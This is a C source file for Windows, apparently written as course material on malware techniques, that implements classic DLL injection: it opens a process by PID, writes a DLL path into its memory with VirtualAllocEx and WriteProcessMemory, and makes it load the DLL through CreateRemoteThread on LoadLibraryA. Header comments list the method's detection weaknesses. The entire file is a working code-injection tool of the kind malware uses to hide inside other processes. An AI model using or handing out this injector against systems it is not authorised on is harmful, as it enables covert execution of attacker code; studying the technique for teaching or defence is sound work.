#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define BUFSIZE 4096
//idea from https://github.com/kbsec/CS-501-malware-course-public/blob/main/LectureCode/DLL_Injection/inject.cpp
/*
 * Injector.c contains the code for doing a regular DLL injection into a process
 * This is NOT the best way to do it, and is the starting point for injecting in.
 * Problems with this approach: 
 * - DLL has to exist on disk
 * - Calling LoadLibraryA creates an image load callback
 * - Doing anything complex in DLL_PROCESS_ATTACH will probably break stuff
 * - Putting stuff in DLLMAIN means it only runs once, and not when the DLL is already loaded
*/

int main(int argc, char const *argv[])
{
    //if no args, get pid of process we are injecting into
    if (argc < 3){
        printf("Usage: %s <pid> <path_to_dll>\n", argv[0]);
        return 1;
    }
    DWORD pid = atoi(argv[1]);
    
    //get process handle
    HANDLE remoteProc = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, 
        TRUE, 
        pid);

    if(remoteProc == INVALID_HANDLE_VALUE){
        printf("[!] Error opening remote process!");
        return 0;
    }

    //allocate memory for dll path
    SIZE_T buffSize = strlen(argv[2]) + 1 * sizeof(char);
    void* dllBuffer = VirtualAllocEx(
        remoteProc, 
        NULL, 
        buffSize, 
        MEM_RESERVE | MEM_COMMIT, 
        PAGE_READWRITE);
        
    if(!dllBuffer){
        printf("[!] Error allocating buffer in the remote process!");
        return 0;
    }

    //get address of loadlibraryA in kernel32.dll in our process
    //this will be the same addr in the remote process bc kernel32 is in the same location on any process on boot
    HANDLE hkernel32 = GetModuleHandleA("kernel32.dll");
    if(hkernel32 == INVALID_HANDLE_VALUE){
        printf("[!] Error getting handle for kernel32.dll!");
        return 0;
    }

    //get address of loadlibraryA in kernel32.dll
    FARPROC LLAaddr = GetProcAddress(
        hkernel32, 
        "LoadLibraryA"
    );

    if(!LLAaddr){
        printf("[!] Error getting process address for LoadLibraryA");
        return 0;
    }

    //copy the path of the dll in to the remote process
    if(!WriteProcessMemory(
        remoteProc, 
        dllBuffer, 
        argv[2], 
        buffSize, 
        NULL)){
            printf("[!] Error writing process memory!");
            return 0;
    }

    //force process to execute loadlibraryA
    DWORD id;
    HANDLE hRThread = CreateRemoteThread(
        remoteProc, 
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE) LLAaddr, 
        dllBuffer, 
        0, 
        &id);

    if(hRThread == INVALID_HANDLE_VALUE){
        printf("[!] Error creating remote thread!");
    }

    WaitForSingleObject(hRThread, 15000); //arbitrary timeout
    //cleanup
    CloseHandle(hRThread);
    CloseHandle(remoteProc);
    FreeLibrary(hkernel32);
    return 0;
}